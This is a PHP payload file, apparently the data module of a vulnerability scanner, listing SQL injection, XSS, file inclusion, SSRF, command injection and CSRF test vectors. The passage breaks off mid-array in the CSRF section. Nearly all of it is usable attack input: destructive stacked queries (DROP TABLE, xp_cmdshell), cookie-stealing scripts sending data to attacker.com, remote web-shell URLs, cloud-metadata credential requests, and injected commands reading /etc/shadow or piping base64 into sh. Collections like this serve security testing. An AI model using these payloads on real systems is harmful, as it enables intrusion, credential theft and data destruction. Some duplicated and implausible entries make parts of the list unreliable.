<?php

namespace Grim\Data;

/**
 * Vulnerability Testing Payloads
 * 
 * This file contains arrays of payloads for testing various security vulnerabilities.
 * Each array contains test vectors that can be used to detect specific vulnerability types.
 */

class Payloads
{
    /**
     * SQL Injection payloads
     */
    public static array $sqlInjection = [
        // Basic SQL Injection
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "') OR ('1'='1'#",
        
        // UNION-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@version--",
        "' UNION SELECT database()--",
        "' UNION SELECT user()--",
        "' UNION SELECT current_user()--",
        "' UNION SELECT @@hostname--",
        "' UNION SELECT @@datadir--",
        
        // Error-based
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e))s), 8446744073709551610, 8446744073709551610)))--",
        
        // Boolean-based
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT 1)=1--",
        "' AND (SELECT 1)=2--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND (SELECT COUNT(*) FROM users)>100--",
        
        // Time-based
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND (SELECT * FROM (SELECT(BENCHMARK(5000000,MD5(1))))a)--",
        "' WAITFOR DELAY '00:00:05'--",
        "' AND 1=(SELECT COUNT(*) FROM tabname); WAITFOR DELAY '00:00:05'--",
        
        // Stacked queries
        "'; DROP TABLE users--",
        "'; DELETE FROM users--",
        "'; INSERT INTO users VALUES (1,'hacked')--",
        "'; EXEC xp_cmdshell('dir');--",
        "'; EXEC xp_cmdshell('whoami');--",
        "'; EXEC xp_cmdshell('net user');--",
        
        // Advanced techniques
        "admin'--",
        "admin' #",
        "admin'/*",
        "1' OR '1' = '1' LIMIT 1--",
        "1' OR '1'='1' ORDER BY 1--",
        "1' OR '1'='1' ORDER BY 2--",
        "1' OR '1'='1' ORDER BY 3--",
        "1' OR '1'='1' GROUP BY 1--",
        "1' OR '1'='1' GROUP BY 1,2--",
        
        // Blind SQL Injection
        "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--",
        "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97--",
        "' AND (SELECT CASE WHEN (username='admin' AND SUBSTRING(password,1,1)='a') THEN SLEEP(5) ELSE 0 END FROM users)--",
        
        // NoSQL Injection
        "' || '1'=='1",
        "' || 1==1",
        "'; return true; var x='",
        "'; return false; var x='",
        "'; return 1; var x='",
        "'; return 0; var x='"
    ];

    /**
     * Cross-Site Scripting (XSS) payloads
     */
    public static array $xss = [
        // Basic XSS
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert(/XSS/)</script>",
        
        // Event handlers
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(/XSS/)>",
        "<img src=x onerror=eval('alert(1)')>",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
        
        // SVG XSS
        "<svg onload=alert('XSS')>",
        "<svg><script>alert('XSS')</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><animate attributeName=onload values=alert(1)>",
        
        // JavaScript protocols
        "javascript:alert('XSS')",
        "javascript:alert(1)",
        "javascript:alert(/XSS/)",
        "javascript:void(alert(1))",
        "javascript:alert(1)//",
        
        // Iframe XSS
        "<iframe src=javascript:alert('XSS')>",
        "<iframe src=javascript:alert(1)>",
        "<iframe src=data:text/html,<script>alert(1)</script>>",
        
        // Body events
        "<body onload=alert('XSS')>",
        "<body onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<body onfocus=alert(1)>",
        
        // Form elements
        "<input onfocus=alert('XSS') autofocus>",
        "<input onblur=alert(1) autofocus>",
        "<input onchange=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        
        // Advanced techniques
        "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
        "<script>new Image().src='http://attacker.com?cookie='+document.cookie;</script>",
        "<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://attacker.com?cookie='+document.cookie);xhr.send();</script>",
        
        // HTML5 elements
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<video src=x onerror=alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<applet code=javascript:alert('XSS')>",
        
        // CSS-based XSS
        "<div style=background:url(javascript:alert(1))>",
        "<div style=background:url(data:text/html,<script>alert(1)</script>)>",
        "<div style=background:expression(alert(1))>",
        
        // Encoded XSS
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        
        // Filter bypass
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>alert(1)</script>",
        "<script>alert(1)</script>",
        "<script>alert(1)</script>",
        
        // DOM XSS
        "<script>document.location='javascript:alert(1)'</script>",
        "<script>document.location.href='javascript:alert(1)'</script>",
        "<script>window.location='javascript:alert(1)'</script>",
        
        // Event delegation
        "<div onclick=alert(1)>click me</div>",
        "<div onmouseover=alert(1)>hover me</div>",
        "<div onmouseenter=alert(1)>enter me</div>",
        "<div onmouseleave=alert(1)>leave me</div>",
        
        // Template injection
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        
        // AngularJS
        "{{constructor.constructor('alert(1)')()}}",
        "{{[].pop.constructor('alert(1)')()}}",
        "{{[].constructor.constructor('alert(1)')()}}",
        
        // React
        "javascript:void(alert(1))",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)"
    ];

    /**
     * Local File Inclusion (LFI) payloads
     */
    public static array $lfi = [
        // Unix/Linux paths
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "....//....//....//....//etc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/issue",
        "/proc/version",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/self/fd/3",
        "/proc/self/fd/4",
        "/proc/self/fd/5",
        "/proc/self/fd/6",
        "/proc/self/fd/7",
        "/proc/self/fd/8",
        "/proc/self/fd/9",
        "/proc/self/fd/10",
        
        // Windows paths
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\windows\\win.ini",
        "C:\\windows\\win.ini",
        "C:\\windows\\system.ini",
        "C:\\windows\\win.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\windows\\system32\\config\\sam",
        "C:\\windows\\system32\\config\\system",
        "C:\\windows\\system32\\config\\software",
        "C:\\windows\\system32\\config\\security",
        "C:\\windows\\system32\\config\\default",
        "C:\\windows\\system32\\config\\sam",
        "C:\\windows\\system32\\config\\system",
        "C:\\windows\\system32\\config\\software",
        "C:\\windows\\system32\\config\\security",
        "C:\\windows\\system32\\config\\default",
        
        // URL encoded
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%255c..%255c..%255cwindows%255cwin.ini",
        
        // Double encoding
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
        "..%c0%af..%c0%af..%c0%afetc%c0%afshadow",
        "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem.ini",
        
        // PHP wrapper
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=admin.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "php://filter/read=convert.base64-encode/resource=admin.php",
        
        // Data wrapper
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKT8+",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+",
        
        // Expect wrapper
        "expect://id",
        "expect://whoami",
        "expect://ls",
        "expect://cat /etc/passwd",
        
        // Input wrapper
        "php://input",
        "data://text/plain,<?php system('id'); ?>",
        "data://text/plain,<?php system('whoami'); ?>",
        "data://text/plain,<?php system('ls'); ?>",
        
        // File wrapper
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///proc/version",
        "file://C:/windows/win.ini",
        "file://C:/windows/system.ini",
        
        // Zip wrapper
        "zip://archive.zip#file.txt",
        "zip://archive.zip%23file.txt",
        "zip://archive.zip%23file.txt",
        
        // Phar wrapper
        "phar://archive.phar/file.txt",
        "phar://archive.phar%2Ffile.txt",
        
        // Common web files
        "../../../index.php",
        "../../../config.php",
        "../../../admin.php",
        "../../../wp-config.php",
        "../../../config.ini",
        "../../../.env",
        "../../../.htaccess",
        "../../../robots.txt",
        "../../../sitemap.xml",
        "../../../README.md",
        "../../../CHANGELOG.md",
        "../../../LICENSE",
        "../../../composer.json",
        "../../../package.json",
        "../../../web.config",
        "../../../.git/config",
        "../../../.svn/entries"
    ];

    /**
     * Remote File Inclusion (RFI) payloads
     */
    public static array $rfi = [
        // Basic RFI
        "http://attacker.com/shell.txt",
        "http://attacker.com/shell.php",
        "http://attacker.com/shell.asp",
        "http://attacker.com/shell.jsp",
        "http://attacker.com/shell.cgi",
        "http://attacker.com/shell.pl",
        "http://attacker.com/shell.py",
        "http://attacker.com/shell.rb",
        "http://attacker.com/shell.sh",
        "http://attacker.com/shell.bat",
        "http://attacker.com/shell.cmd",
        "http://attacker.com/shell.vbs",
        "http://attacker.com/shell.ps1",
        "http://attacker.com/shell.exe",
        "http://attacker.com/shell.dll",
        "http://attacker.com/shell.so",
        "http://attacker.com/shell.dylib",
        "http://attacker.com/shell.jar",
        "http://attacker.com/shell.war",
        "http://attacker.com/shell.ear",
        
        // Alternative domains
        "https://attacker.com/shell.php",
        "ftp://attacker.com/shell.php",
        "gopher://attacker.com/shell.php",
        "dict://attacker.com/shell.php",
        "ldap://attacker.com/shell.php",
        "tftp://attacker.com/shell.php",
        "sftp://attacker.com/shell.php",
        "scp://attacker.com/shell.php",
        
        // Common shell names
        "http://attacker.com/c99.php",
        "http://attacker.com/r57.php",
        "http://attacker.com/b374k.php",
        "http://attacker.com/weevely.php",
        "http://attacker.com/webshell.php",
        "http://attacker.com/shell.php",
        "http://attacker.com/cmd.php",
        "http://attacker.com/backdoor.php",
        "http://attacker.com/admin.php",
        "http://attacker.com/root.php",
        "http://attacker.com/hack.php",
        "http://attacker.com/exploit.php",
        "http://attacker.com/payload.php",
        "http://attacker.com/malware.php",
        "http://attacker.com/virus.php",
        "http://attacker.com/trojan.php",
        "http://attacker.com/worm.php",
        "http://attacker.com/spyware.php",
        "http://attacker.com/keylogger.php",
        "http://attacker.com/stealer.php",
        
        // Encoded URLs
        "http://attacker.com/shell.php%00",
        "http://attacker.com/shell.php%0a",
        "http://attacker.com/shell.php%0d",
        "http://attacker.com/shell.php%0d%0a",
        "http://attacker.com/shell.php%20",
        "http://attacker.com/shell.php%09",
        "http://attacker.com/shell.php%0c",
        "http://attacker.com/shell.php%0b",
        
        // Alternative file extensions
        "http://attacker.com/shell.phtml",
        "http://attacker.com/shell.pht",
        "http://attacker.com/shell.php3",
        "http://attacker.com/shell.php4",
        "http://attacker.com/shell.php5",
        "http://attacker.com/shell.php7",
        "http://attacker.com/shell.phar",
        "http://attacker.com/shell.inc",
        "http://attacker.com/shell.ini",
        "http://attacker.com/shell.conf",
        "http://attacker.com/shell.cfg",
        "http://attacker.com/shell.xml",
        "http://attacker.com/shell.json",
        "http://attacker.com/shell.txt",
        "http://attacker.com/shell.log",
        "http://attacker.com/shell.dat",
        "http://attacker.com/shell.bin",
        "http://attacker.com/shell.exe",
        "http://attacker.com/shell.com",
        "http://attacker.com/shell.scr",
        "http://attacker.com/shell.pif",
        "http://attacker.com/shell.bat",
        "http://attacker.com/shell.cmd",
        "http://attacker.com/shell.vbs",
        "http://attacker.com/shell.ps1",
        "http://attacker.com/shell.js",
        "http://attacker.com/shell.vbe",
        "http://attacker.com/shell.wsf",
        "http://attacker.com/shell.hta",
        "http://attacker.com/shell.reg",
        "http://attacker.com/shell.inf",
        "http://attacker.com/shell.ins",
        "http://attacker.com/shell.isp",
        "http://attacker.com/shell.url",
        "http://attacker.com/shell.lnk",
        "http://attacker.com/shell.scf",
        "http://attacker.com/shell.wsh",
        "http://attacker.com/shell.sct",
        "http://attacker.com/shell.wsc",
        "http://attacker.com/shell.ocx",
        "http://attacker.com/shell.dll",
        "http://attacker.com/shell.sys",
        "http://attacker.com/shell.drv",
        "http://attacker.com/shell.tsk",
        "http://attacker.com/shell.mst",
        "http://attacker.com/shell.cpl",
        "http://attacker.com/shell.msc",
        "http://attacker.com/shell.msi",
        "http://attacker.com/shell.msp",
        "http://attacker.com/shell.mst",
        "http://attacker.com/shell.paf",
        "http://attacker.com/shell.app",
        "http://attacker.com/shell.fon",
        "http://attacker.com/shell.otf",
        "http://attacker.com/shell.ttf",
        "http://attacker.com/shell.eot",
        "http://attacker.com/shell.woff",
        "http://attacker.com/shell.woff2",
        "http://attacker.com/shell.svg",
        "http://attacker.com/shell.ico",
        "http://attacker.com/shell.cur",
        "http://attacker.com/shell.ani",
        "http://attacker.com/shell.bmp",
        "http://attacker.com/shell.gif",
        "http://attacker.com/shell.jpg",
        "http://attacker.com/shell.jpeg",
        "http://attacker.com/shell.png",
        "http://attacker.com/shell.tiff",
        "http://attacker.com/shell.webp",
        "http://attacker.com/shell.ico",
        "http://attacker.com/shell.cur",
        "http://attacker.com/shell.ani",
        "http://attacker.com/shell.bmp",
        "http://attacker.com/shell.gif",
        "http://attacker.com/shell.jpg",
        "http://attacker.com/shell.jpeg",
        "http://attacker.com/shell.png",
        "http://attacker.com/shell.tiff",
        "http://attacker.com/shell.webp"
    ];

    /**
     * Server-Side Request Forgery (SSRF) payloads
     */
    public static array $ssrf = [
        // Localhost variations
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://[::1]",
        "http://::1",
        "http://localhost.localdomain",
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.xip.io",
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.xip.io",
        
        // Common ports
        "http://localhost:22",
        "http://127.0.0.1:22",
        "http://localhost:21",
        "http://127.0.0.1:21",
        "http://localhost:23",
        "http://127.0.0.1:23",
        "http://localhost:25",
        "http://127.0.0.1:25",
        "http://localhost:53",
        "http://127.0.0.1:53",
        "http://localhost:80",
        "http://127.0.0.1:80",
        "http://localhost:110",
        "http://127.0.0.1:110",
        "http://localhost:143",
        "http://127.0.0.1:143",
        "http://localhost:443",
        "http://127.0.0.1:443",
        "http://localhost:993",
        "http://127.0.0.1:993",
        "http://localhost:995",
        "http://127.0.0.1:995",
        
        // Database ports
        "http://localhost:3306",
        "http://127.0.0.1:3306",
        "http://localhost:5432",
        "http://127.0.0.1:5432",
        "http://localhost:6379",
        "http://127.0.0.1:6379",
        "http://localhost:27017",
        "http://127.0.0.1:27017",
        "http://localhost:1433",
        "http://127.0.0.1:1433",
        "http://localhost:1521",
        "http://127.0.0.1:1521",
        "http://localhost:9200",
        "http://127.0.0.1:9200",
        "http://localhost:9300",
        "http://127.0.0.1:9300",
        
        // Web server ports
        "http://localhost:8080",
        "http://127.0.0.1:8080",
        "http://localhost:8000",
        "http://127.0.0.1:8000",
        "http://localhost:8888",
        "http://127.0.0.1:8888",
        "http://localhost:9000",
        "http://127.0.0.1:9000",
        "http://localhost:3000",
        "http://127.0.0.1:3000",
        "http://localhost:5000",
        "http://127.0.0.1:5000",
        "http://localhost:7000",
        "http://127.0.0.1:7000",
        
        // Cache and message queue ports
        "http://localhost:11211",
        "http://127.0.0.1:11211",
        "http://localhost:5672",
        "http://127.0.0.1:5672",
        "http://localhost:61616",
        "http://127.0.0.1:61616",
        "http://localhost:2181",
        "http://127.0.0.1:2181",
        "http://localhost:9092",
        "http://127.0.0.1:9092",
        
        // Cloud metadata endpoints
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/placement/availability-zone",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/public-hostname",
        "http://169.254.169.254/latest/meta-data/local-hostname",
        
        // Alternative cloud metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.azure.internal/metadata/instance",
        "http://metadata.cloud.internal/metadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/instance",
        "http://169.254.169.254/metadata/v1/instance/id",
        "http://169.254.169.254/metadata/v1/instance/type",
        "http://169.254.169.254/metadata/v1/instance/name",
        
        // Internal network ranges
        "http://10.0.0.1",
        "http://10.0.0.2",
        "http://10.0.1.1",
        "http://10.0.1.2",
        "http://192.168.0.1",
        "http://192.168.0.2",
        "http://192.168.1.1",
        "http://192.168.1.2",
        "http://172.16.0.1",
        "http://172.16.1.1",
        "http://172.20.0.1",
        "http://172.20.1.1",
        
        // Alternative protocols
        "ftp://localhost",
        "ftp://127.0.0.1",
        "gopher://localhost",
        "gopher://127.0.0.1",
        "dict://localhost",
        "dict://127.0.0.1",
        "ldap://localhost",
        "ldap://127.0.0.1",
        "tftp://localhost",
        "tftp://127.0.0.1",
        "sftp://localhost",
        "sftp://127.0.0.1",
        "scp://localhost",
        "scp://127.0.0.1",
        
        // Encoded variations
        "http://localhost%3A8080",
        "http://127.0.0.1%3A8080",
        "http://localhost%3A3306",
        "http://127.0.0.1%3A3306",
        "http://localhost%3A5432",
        "http://127.0.0.1%3A5432",
        "http://localhost%3A6379",
        "http://127.0.0.1%3A6379",
        "http://localhost%3A27017",
        "http://127.0.0.1%3A27017",
        
        // Double encoding
        "http://localhost%253A8080",
        "http://127.0.0.1%253A8080",
        "http://localhost%253A3306",
        "http://127.0.0.1%253A3306",
        "http://localhost%253A5432",
        "http://127.0.0.1%253A5432",
        "http://localhost%253A6379",
        "http://127.0.0.1%253A6379",
        "http://localhost%253A27017",
        "http://127.0.0.1%253A27017"
    ];

    /**
     * Command Injection payloads
     */
    public static array $commandInjection = [
        // Basic command separators
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",
        "`ls`",
        "$(ls)",
        "| ls |",
        "& ls &",
        "&& ls &&",
        "|| ls ||",
        "`ls`;",
        "$(ls);",
        
        // File reading commands
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "& cat /etc/passwd",
        "&& cat /etc/passwd",
        "|| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; cat /etc/shadow",
        "| cat /etc/shadow",
        "& cat /etc/shadow",
        "&& cat /etc/shadow",
        "|| cat /etc/shadow",
        "`cat /etc/shadow`",
        "$(cat /etc/shadow)",
        "; cat /etc/hosts",
        "| cat /etc/hosts",
        "& cat /etc/hosts",
        "&& cat /etc/hosts",
        "|| cat /etc/hosts",
        "`cat /etc/hosts`",
        "$(cat /etc/hosts)",
        
        // System information commands
        "; whoami",
        "| whoami",
        "& whoami",
        "&& whoami",
        "|| whoami",
        "`whoami`",
        "$(whoami)",
        "; id",
        "| id",
        "& id",
        "&& id",
        "|| id",
        "`id`",
        "$(id)",
        "; uname -a",
        "| uname -a",
        "& uname -a",
        "&& uname -a",
        "|| uname -a",
        "`uname -a`",
        "$(uname -a)",
        
        // Directory listing commands
        "; ls -la",
        "| ls -la",
        "& ls -la",
        "&& ls -la",
        "|| ls -la",
        "`ls -la`",
        "$(ls -la)",
        "; dir",
        "| dir",
        "& dir",
        "&& dir",
        "|| dir",
        "`dir`",
        "$(dir)",
        "; pwd",
        "| pwd",
        "& pwd",
        "&& pwd",
        "|| pwd",
        "`pwd`",
        "$(pwd)",
        
        // Process commands
        "; ps aux",
        "| ps aux",
        "& ps aux",
        "&& ps aux",
        "|| ps aux",
        "`ps aux`",
        "$(ps aux)",
        "; top",
        "| top",
        "& top",
        "&& top",
        "|| top",
        "`top`",
        "$(top)",
        "; netstat -an",
        "| netstat -an",
        "& netstat -an",
        "&& netstat -an",
        "|| netstat -an",
        "`netstat -an`",
        "$(netstat -an)",
        
        // Network commands
        "; ifconfig",
        "| ifconfig",
        "& ifconfig",
        "&& ifconfig",
        "|| ifconfig",
        "`ifconfig`",
        "$(ifconfig)",
        "; ip addr",
        "| ip addr",
        "& ip addr",
        "&& ip addr",
        "|| ip addr",
        "`ip addr`",
        "$(ip addr)",
        "; route -n",
        "| route -n",
        "& route -n",
        "&& route -n",
        "|| route -n",
        "`route -n`",
        "$(route -n)",
        
        // User management commands
        "; cat /etc/passwd | grep root",
        "| cat /etc/passwd | grep root",
        "& cat /etc/passwd | grep root",
        "&& cat /etc/passwd | grep root",
        "|| cat /etc/passwd | grep root",
        "`cat /etc/passwd | grep root`",
        "$(cat /etc/passwd | grep root)",
        "; cat /etc/group | grep admin",
        "| cat /etc/group | grep admin",
        "& cat /etc/group | grep admin",
        "&& cat /etc/group | grep admin",
        "|| cat /etc/group | grep admin",
        "`cat /etc/group | grep admin`",
        "$(cat /etc/group | grep admin)",
        
        // File system commands
        "; df -h",
        "| df -h",
        "& df -h",
        "&& df -h",
        "|| df -h",
        "`df -h`",
        "$(df -h)",
        "; du -sh /",
        "| du -sh /",
        "& du -sh /",
        "&& du -sh /",
        "|| du -sh /",
        "`du -sh /`",
        "$(du -sh /)",
        "; find / -name '*.txt' -type f",
        "| find / -name '*.txt' -type f",
        "& find / -name '*.txt' -type f",
        "&& find / -name '*.txt' -type f",
        "|| find / -name '*.txt' -type f",
        "`find / -name '*.txt' -type f`",
        "$(find / -name '*.txt' -type f)",
        
        // Windows specific commands
        "; dir C:\\",
        "| dir C:\\",
        "& dir C:\\",
        "&& dir C:\\",
        "|| dir C:\\",
        "`dir C:\\`",
        "$(dir C:\\)",
        "; type C:\\windows\\win.ini",
        "| type C:\\windows\\win.ini",
        "& type C:\\windows\\win.ini",
        "&& type C:\\windows\\win.ini",
        "|| type C:\\windows\\win.ini",
        "`type C:\\windows\\win.ini`",
        "$(type C:\\windows\\win.ini)",
        "; net user",
        "| net user",
        "& net user",
        "&& net user",
        "|| net user",
        "`net user`",
        "$(net user)",
        
        // Advanced techniques
        "; bash -c 'ls -la'",
        "| bash -c 'ls -la'",
        "& bash -c 'ls -la'",
        "&& bash -c 'ls -la'",
        "|| bash -c 'ls -la'",
        "`bash -c 'ls -la'`",
        "$(bash -c 'ls -la')",
        "; sh -c 'whoami'",
        "| sh -c 'whoami'",
        "& sh -c 'whoami'",
        "&& sh -c 'whoami'",
        "|| sh -c 'whoami'",
        "`sh -c 'whoami'`",
        "$(sh -c 'whoami')",
        
        // Encoded commands
        "; echo 'bHMgLWxh' | base64 -d | sh",
        "| echo 'bHMgLWxh' | base64 -d | sh",
        "& echo 'bHMgLWxh' | base64 -d | sh",
        "&& echo 'bHMgLWxh' | base64 -d | sh",
        "|| echo 'bHMgLWxh' | base64 -d | sh",
        "`echo 'bHMgLWxh' | base64 -d | sh`",
        "$(echo 'bHMgLWxh' | base64 -d | sh)",
        
        // Time-based commands
        "; sleep 5",
        "| sleep 5",
        "& sleep 5",
        "&& sleep 5",
        "|| sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "; ping -c 1 127.0.0.1",
        "| ping -c 1 127.0.0.1",
        "& ping -c 1 127.0.0.1",
        "&& ping -c 1 127.0.0.1",
        "|| ping -c 1 127.0.0.1",
        "`ping -c 1 127.0.0.1`",
        "$(ping -c 1 127.0.0.1)"
    ];

    /**
     * CSRF payloads
     */
    public static array $csrf = [
        // Basic CSRF
        "<img src=\"http://target.com/action\" style=\"display:none\">",
        "<iframe src=\"http://target.com/action\" style=\"display:none\"></iframe>",
        "<form action=\"http://target.com/action\" method=\"POST\" id=\"csrf\">",
        "<input type=\"hidden\" name=\"token\" value=\"stolen_token\">",
        "</form>",
        "<script>document.getElementById('csrf').submit();</script>",
        
        // Image-based CSRF
        "<img src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
        "<img src=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
        "<img src=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
        "<img src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
        "<img src=\"http://target.com/action\" onprogress=\"document.forms[0].submit()\">",
        "<img src=\"http://target.com/action\" oncanplay=\"document.forms[0].submit()\">",
        "<img src=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
        "<img src=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
        "<img src=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
        "<img src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
        
        // Iframe-based CSRF
        "<iframe src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
        "<iframe src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
        "<iframe src=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
        "<iframe src=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
        "<iframe src=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
        
        // Link-based CSRF
        "<link rel=\"stylesheet\" href=\"http://target.com/action\">",
        "<link rel=\"preload\" href=\"http://target.com/action\">",
        "<link rel=\"prefetch\" href=\"http://target.com/action\">",
        "<link rel=\"dns-prefetch\" href=\"http://target.com/action\">",
        "<link rel=\"prerender\" href=\"http://target.com/action\">",
        "<link rel=\"modulepreload\" href=\"http://target.com/action\">",
        
        // Meta-based CSRF
        "<meta http-equiv=\"refresh\" content=\"0;url=http://target.com/action\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=http://target.com/action\">",
        "<meta http-equiv=\"refresh\" content=\"1;url=http://target.com/action\">",
        "<meta http-equiv=\"refresh\" content=\"5;url=http://target.com/action\">",
        "<meta http-equiv=\"refresh\" content=\"10;url=http://target.com/action\">",
        
        // Object-based CSRF
        "<object data=\"http://target.com/action\">",
        "<object data=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
        "<object data=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
        "<object data=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
        "<object data=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
        "<object data=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
        
        // Embed-based CSRF
        "<embed src=\"http://target.com/action\">",
        "<embed src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
        "<embed src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
        "<embed src=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
        "<embed src=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
        "<embed src=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
        
        // Applet-based CSRF
        "<applet code=\"http://target.com/action\">",
        "<applet code=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
        "<applet code=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
        "<applet code=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
        "<applet code=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
        "<applet code=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
        
        // Marquee-based CSRF
        "<marquee onstart=\"document.forms[0].submit()\">",
        "<marquee onbounce=\"document.forms[0].submit()\">",
        "<marquee onfinish=\"document.forms[0].submit()\">",
        "<marquee onload=\"document.forms[0].submit()\">",
        "<marquee onloadstart=\"document.forms[0].submit()\">",
        "<marquee onloadend=\"document.forms[0].submit()\">",
        
        // Details-based CSRF
        "<details open ontoggle=\"document.forms[0].submit()\">",
        "<details open onload=\"document.forms[0].submit()\">",
        "<details open onloadstart=\"document.forms[0].submit()\">",
        "<details open onloadend=\"document.forms[0].submit()\">",
        "<details open onabort=\"document.forms[0].submit()\">",
        "<details open onerror=\"document.forms[0].submit()\">",
        
        // Audio-based CSRF
        "<audio src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
        "<audio src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
